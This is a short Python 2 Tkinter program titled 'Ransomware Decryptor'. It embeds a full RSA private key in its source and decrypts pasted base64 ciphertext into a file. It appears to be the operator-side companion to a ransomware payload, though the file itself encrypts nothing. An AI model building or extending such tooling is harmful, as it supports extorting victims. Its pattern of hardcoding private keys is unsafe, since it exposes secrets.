import os, random, io
import string
from Crypto.PublicKey import RSA
import Tkinter as tk
from PIL import ImageTk, Image
import tkFont

PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----\n\
MIIEogIBAAKCAQEAlERucWY3fsCqKLYR8qmNi28Vg6cgjYPu469XolKPOm+WrMqO\n\
pJpzdZ0ntF5DjzYl7DbkRJYlmMWmtlMaPP/8xD/S6CY+0klnjtVda5M2XROqfeWT\n\
Ejzt3Ql+/Ld6ko38gd7c4K2CJ/2pDwIuQPcohPVK9baiwaEztD2sZHwnU7e8oXgY\n\
VOJVriO04FrA/23eFtm1ZZ/ROJ+IE5bxl6NR87bwPX1t80YA27Hh/eUWY6zCFIDi\n\
YDfQk8SCtjMvWcqLZBViTYlhcOYfbFrVFq3zqcSdE9XAZJow2X0pMl1kyCI0N8st\n\
+zIpWMOejlGodl2xkRUfyTBqDrgjrpXm5H+znwIDAQABAoIBAFpoZ9fp9kjp/lgY\n\
vVT0ooS1Va8Th7wDCPX5AzzNjtyZEo2Gbfhc3a6IB5/qItP+tp0U05gm3gIL854V\n\
ilhL17trF5XLTF85t1XXMMHZ4DpdNYbTKBzk3j37/lznHGyk+6XNWW3/HvB3slCe\n\
icm/bAu27uBpX1EmlLqBKM+VDP30i8vDNUc3UwWtn9TTTHtd4ZWgIxjL2tTzKYMG\n\
C91Wz2is6BlGKqX7WLZw6AxNSJvi5ZjfG48CiuBBJaDwzLH3rnuGb9dyNv/nSLgG\n\
TvQz2GAiwlV/Nr17Qu6uoLxa+dWl1lqJLsbslLxTzSRAhUVocYdDuEvKKky04/gT\n\
QcQDRBECgYEAuevNzfa/mZJY1TzPXB4PjTFkWwq2cl16ViTZODf2CtU2yQW9KbED\n\
M537H4fIq0v7gMAQa+rL9OQ6Z5ZnCHPrT01WxXVSfqlcGFVhBSyVsf5//tpiAvJK\n\
70uhK4q1a3A70xBkgkW7uvp7xrsCQMh4fOrXntMdjCPsNyITjSCol9UCgYEAzCdG\n\
8DFkR8SDBqy19eWlNmQfDu/LtnXkB4XqLTmvOHCPf0mYwSAT/pG9EqhnLzAqtH/7\n\
vbge70HxquBPd1p8aVv9DOnUrX4sw4+sNyOKFsYkBVkTUGkVtsXnEHT10c0OeAIo\n\
tymIPgJjZ8ujShIgdLmUITGBo+x3pCdmhgxta6MCgYAa7vQTgEllX/QKgBKyD5DF\n\
LYCSR80CaFROomvtXv3/t7+GA5TRs1j5Y0t719nUJt+6WRiH6a2+PknPs9QdP125\n\
UUTeug5HVxWGWOgDLeBJtsqoCs7kCmGcpOImQqPhepLQErHcxWlavuqrcW/0HpaF\n\
0ieGVKMVKCcSHZejfDWwOQKBgDPPY/lhD4oHHRl8i1E0TpFXJ2qrAI/1q0Edgyin\n\
EwjHyCMNkm6wrWJVqh4qDsWy+6ODN2gWagNeQO6UrpYjqJ80cSvty8Ob2dBnjdUQ\n\
d+L/tfSFfplRkekooFNU2227FIjwQ1T4fVL/WCrnSzFpGEOHNUiXP8dSI6rNNP+f\n\
98TxAoGAeYAs+fQnM9ncCpUy2RLNwgiFodUIS2V1jZwMmC8gIU1IIbZBqW+FOHud\n\
J4ZvGAXXmBjYgiYZ6LNMD+LVhfXPlBoqaWaDuDtkroORAJYqnTEswyZ44b3i765I\n\
p01w5LmJglAnUkUfGFiFU+2NL1C+cJLBf4eYL352rHIAcMeABtE=\n\
-----END RSA PRIVATE KEY-----"


def decrypt():
        global ciphertext
        ciphertext=cipherField.get("1.0", "end-1c")
        privateKey=RSA.importKey(PRIVATE_KEY)
        decrypted = privateKey.decrypt(ciphertext.decode('base64'))
        f = open ('decrypted.txt', 'w')
        f.write(str(decrypted))
        f.close()



class Application(tk.Frame):
        
        
                

        def __init__(self, master=None):
       
                tk.Frame.__init__(self, master, cursor="pirate")   
                self.grid()       
               
                defaultFont=tkFont.Font(size=14, family='Arial')  

                #Logo Image
                imgLocation=Image.open("anonymous.png")
                myImage=ImageTk.PhotoImage(imgLocation)
                self.imgLogo=tk.Label(self,image=myImage)
                self.imgLogo.grid(column=0, row=0, columnspan=3)
                self.imgLogo.image=myImage

                global cipherField
                cipherField=tk.Text(self, width=80, height=5)
                cipherField.grid(column=0, columnspan=3, row=1, padx=30, pady=30)

                decryptButton=tk.Button(self, text="Decrypt", font=defaultFont, command=decrypt)
                decryptButton.grid(column=0, columnspan=3, row=2, pady=10)

                
        

app = Application()                       
app.master.title('Ransomware Decryptor')    
app.mainloop()    


